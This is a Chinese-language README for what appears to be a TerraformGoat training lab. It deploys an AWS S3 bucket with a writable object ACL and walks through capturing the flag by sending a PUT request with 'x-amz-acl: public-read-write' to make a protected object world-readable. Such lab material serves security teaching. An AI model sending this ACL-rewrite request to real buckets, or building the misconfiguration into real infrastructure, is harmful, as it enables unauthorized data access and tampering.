# 描述

[English](./README.md) | 中文

这是一个可以帮你快速构建存储桶对象ACL可读写场景的脚本

虽然你在实际环境中可能不会遇到，玩的愉快

## 部署环境

```bash
cd /TerraformGoat/aws/object_storage_service/object_acl_writable/
```

![image-20220426152245856](../../../images/image-20220426152245856.png)

配置 AWS 访问凭证

```shell
aws configure
```

> 在 AWS 「控制台——》安全凭证」处可以设置并查看你的 `aws_access_key_id` 和 `aws_secret_access_key`

```bash
terraform init
```

![image-20220426152354009](../../../images/image-20220426152354009.png)

```bash
terraform apply
```

![image-20220426152417710](../../../images/image-20220426152417710.png)

![image-20220426152428214](../../../images/image-20220426152428214.png)

输入yes之后，会自动的快速构建场景

## Get Flag

![image-20220426152550418](../../../images/image-20220426152550418.png)

我们看到的文件的列表，尝试访问index.html

![image-20220426152651701](../../../images/image-20220426152651701.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
```

禁止访问，但是我们可以通过PUT方法，在请求头中添加`x-amz-acl`中添加`public-read-write`来修改这个对象是否可以读或写

![image-20220426152744234](../../../images/image-20220426152744234.png)

![image-20220426172410852](../../../images/image-20220426172410852.png)

```http
PUT /index.html?acl HTTP/1.1
Host: hxseclabteztq.s3.eu-west-1.amazonaws.com
x-amz-acl: public-read-write
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

然后我们再获取一下这个对象的ACL，会发现，现在所有用户都可以对其进行读写

![image-20220426172506589](../../../images/image-20220426172506589.png)

随后在访问这个index.html，成功获取flag

![image-20220426172534934](../../../images/image-20220426172534934.png)

## 销毁挑战

```bash
terraform destroy
```

![image-20220426173539820](../../../images/image-20220426173539820.png)

输入yes即可

![image-20220426173554665](../../../images/image-20220426173554665.png)
